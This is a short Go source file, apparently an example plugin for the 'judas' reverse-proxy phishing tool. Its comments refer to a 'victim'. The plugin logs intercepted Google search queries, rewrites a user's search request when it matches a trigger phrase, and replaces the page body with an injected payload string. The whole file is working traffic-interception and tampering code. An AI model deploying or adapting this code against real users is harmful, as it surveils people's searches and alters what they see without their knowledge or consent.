package main

import (
	"bytes"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/joncooperworks/judas"
)

type searchLoggingPlugin struct {
	logger *log.Logger
}

// Listen pulls google search queries out of HTTP exchanges
func (p *searchLoggingPlugin) Listen(exchanges <-chan *judas.HTTPExchange) {
	for exchange := range exchanges {
		searchQuery := exchange.Request.URL.Query().Get("q")
		if searchQuery != "" && exchange.Request.URL.Host == exchange.Target.Host {
			p.logger.Printf("Search query: %s", searchQuery)
		}
	}
}

// New returns a plugin that logs google searches.
func New(logger *log.Logger) (judas.Listener, error) {
	return &searchLoggingPlugin{logger: logger}, nil
}

// RequestTransformer replaces a victim's search query with something else if they search for the words "modify request".
func RequestTransformer(request *http.Request) error {
	if request.URL.Query().Get("q") == "modify request" {
		query := request.URL.Query()
		query.Set("q", "not what you searched for")
		request.URL.RawQuery = query.Encode()
	}
	return nil
}

// ResponseTransformer replaces the page contents with our text when a user searches for the word "replace".
func ResponseTransformer(response *http.Response) error {
	if response.Request.URL.Query().Get("q") == "replace" {
		payload := []byte("payload")
		response.Body = ioutil.NopCloser(bytes.NewReader(payload))
	}
	return nil
}
